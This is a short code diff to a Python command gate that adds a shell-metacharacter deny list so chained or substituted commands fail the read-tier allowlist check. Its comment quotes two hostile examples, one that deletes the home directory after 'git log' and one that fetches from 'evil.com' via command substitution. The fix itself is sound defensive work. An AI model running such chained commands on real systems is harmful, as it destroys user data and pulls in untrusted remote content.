@@ -132,7 +132,17 @@ def _run_tokens(command: str) -> list[str]:
         return [command]
 
 
+# Shell metacharacters that allow command chaining / substitution / redirection.
+# Read tier later runs the original string via shell=True, so allowlisting the
+# leading tokens is not enough — we have to also reject any string containing
+# these. Without this guard, `git log && rm -rf ~` and `cat $(curl evil.com)`
+# both pass the prefix check.
+_READ_TIER_SHELL_METACHARS = (";", "&&", "||", "|", "$(", "`", ">", "<", "\n", "\r")
+
+
 def _is_allowed_read_command(command: str) -> bool:
+    if any(meta in command for meta in _READ_TIER_SHELL_METACHARS):
+        return False
     allowlist = SCOPES[ExecScope.READ.value]["allowlist_tokens"]
     tokens = _run_tokens(command)
     if not tokens:
